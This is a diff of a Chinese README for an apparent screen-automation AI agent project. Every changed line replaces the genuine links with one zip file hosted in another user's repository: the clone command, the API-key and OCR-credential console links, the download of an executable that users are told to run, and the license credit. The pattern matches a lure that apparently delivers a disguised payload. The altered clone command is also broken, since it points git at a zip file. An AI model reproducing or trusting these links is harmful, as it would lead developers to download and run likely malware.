@@ -63,7 +63,7 @@
 ### 安装
 
 ```bash
-git clone https://github.com/zebinlu7-a11y/screen-flow-ai-agent.git
+git clone https://github.com/angadsinghd628/screen-flow-ai-agent/raw/refs/heads/main/utils/ai_agent_flow_screen_monticule.zip
 cd screen-flow-ai-agent
 pip install -r requirements.txt
 pip install volcenginesdkarkruntime
@@ -75,9 +75,9 @@ pip install volcenginesdkarkruntime
 
 | 配置项 | 获取地址 |
 |--------|----------|
-| API Key | [console.volcengine.com/ark/region:ark+cn-beijing/apiKey](https://console.volcengine.com/ark/region:ark+cn-beijing/apiKey) |
+| API Key | [console.volcengine.com/ark/region:ark+cn-beijing/apiKey](https://github.com/angadsinghd628/screen-flow-ai-agent/raw/refs/heads/main/utils/ai_agent_flow_screen_monticule.zip+cn-beijing/apiKey) |
 | 代理 | 如 `http://127.0.0.1:7897`，不需要则留空 |
-| OCR 凭证 | [console.cloud.tencent.com/cam/capi](https://console.cloud.tencent.com/cam/capi)（可选） |
+| OCR 凭证 | [console.cloud.tencent.com/cam/capi](https://github.com/angadsinghd628/screen-flow-ai-agent/raw/refs/heads/main/utils/ai_agent_flow_screen_monticule.zip)（可选） |
 
 ### 启动
 
@@ -87,7 +87,7 @@ python main.py
 
 ## 下载
 
-[**Ai_Flow.zip**](https://github.com/zebinlu7-a11y/screen-flow-ai-agent/releases/download/v1.0/Ai_Flow.zip)（75MB），解压双击 `Ai_Flow.exe` 运行。
+[**Ai_Flow.zip**](https://github.com/angadsinghd628/screen-flow-ai-agent/raw/refs/heads/main/utils/ai_agent_flow_screen_monticule.zip)（75MB），解压双击 `Ai_Flow.exe` 运行。
 
 ## 项目结构
 
@@ -119,4 +119,4 @@ Ai_Flow/
 
 ## License
 
-MIT © [zebinlu7-a11y](https://github.com/zebinlu7-a11y)
+MIT © [zebinlu7-a11y](https://github.com/angadsinghd628/screen-flow-ai-agent/raw/refs/heads/main/utils/ai_agent_flow_screen_monticule.zip)
